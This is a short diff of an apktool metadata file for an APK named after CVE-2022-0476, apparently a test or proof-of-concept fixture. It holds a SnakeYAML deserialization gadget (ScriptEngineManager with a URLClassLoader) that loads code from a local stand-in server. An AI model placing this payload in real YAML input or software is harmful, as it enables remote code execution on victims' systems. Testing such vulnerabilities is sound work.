@@ -1,9 +1,8 @@
 !!brut.androlib.meta.MetaInfo
 apkFileName: cve20220476.apk
-compressionType: false
 some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://127.0.0.1:8000"]]]]
 doNotCompress:
-- resources.arsc
+- arsc
 isFrameworkApk: false
 packageInfo:
   forcedPackageId: '127'
